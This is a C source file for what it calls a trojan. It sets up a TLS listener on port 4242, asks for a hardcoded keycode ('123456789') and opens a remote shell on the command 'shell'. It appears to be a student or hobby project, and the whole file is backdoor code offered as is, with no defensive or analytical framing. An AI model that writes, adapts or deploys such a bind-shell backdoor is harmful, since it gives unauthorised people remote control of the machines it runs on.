#include "trojan.h"

#define MAX_CLIENTS 3

int active_connections = 0;
int sig;

void sig_handler(int signal) {
    sig = signal;
}

int handle_recv(SSL *ssl) {
    char buffer[1024];
    char response[1024];

    while (1) {
        SSL_write(ssl, "$> ", 3);
        memset(buffer, 0, 1024);
        size_t valread;
        if (!SSL_read_ex(ssl, buffer, sizeof(buffer) - 1, &valread) || valread <= 0)
            break;
        buffer[valread] = '\0';

        if (!strncmp(buffer, "quit", 4))
            break;
        if (!strncmp(buffer, "shell", 5)) {
            handle_shell(ssl);
        }

        format_response(response, "Command not found\n\n");
        SSL_write(ssl, response, strlen(response));
    }

    return 1;
}

void *handle_client(void *arg) {
    t_args *args;

    args = (t_args *)arg;

    char buffer[1024];
    char keycode[1024] = "123456789";
    char response[1024];
    memset(buffer, 0, 1024);

    while (1) {
        format_response(response, "Enter the keycode:  ");
        SSL_write(args->ssl, response, strlen(response));
        size_t valread;

        SSL_read_ex(args->ssl, buffer, sizeof(buffer) - 1, &valread);
        buffer[valread] = '\0';

        if (sig == SIGPIPE || valread <= 0)
            break;

        if (!strncmp(buffer, keycode, strlen(keycode))) {
            format_response(response, "Connection established, welcome\n\n");
            SSL_write(args->ssl, response, strlen(response));
            if (handle_recv(args->ssl))
                break;
        } else {
            format_response(response, "Connection failed\n\n");
            SSL_write(args->ssl, response, strlen(response));
        }
    }

    printf("close connexion\n");
    SSL_shutdown(args->ssl);
    SSL_free(args->ssl);
    close(args->client_socket);
    free(args);
    active_connections--;

    return NULL;
}

void start_socket_listener() {
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;
    SSL_CTX *ctx = create_context();
    configure_cert(ctx);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(4242);

    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
    listen(server_fd, MAX_CLIENTS);

    printf("Server listening on port 4242\n");

    while (1) {
        t_args *args = calloc(1, sizeof(t_args));
        args->ssl = SSL_new(ctx);
        socklen_t addrlen = sizeof(address);
        args->client_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);

        SSL_set_fd(args->ssl, args->client_socket);
        printf("New connection attempt...\n");
        if (SSL_accept(args->ssl)) {
            if (active_connections >= MAX_CLIENTS) {
                SSL_write(args->ssl, "Connection refused\n", strlen("Connection refused\n"));
                ft_shutdown(args);
                continue;
            }
            active_connections++;
            pthread_t thread_id;
            pthread_create(&thread_id, NULL, handle_client, args);
            pthread_detach(thread_id);
        } else {
            ERR_print_errors_fp(stderr);
            ft_shutdown(args);
        }
    }

    close(server_fd);
    SSL_CTX_free(ctx);
}

int main(int ac, char **av) {
    (void)ac;
    (void)av;
    signal(SIGPIPE, sig_handler);
    start_socket_listener();
    return 0;
}
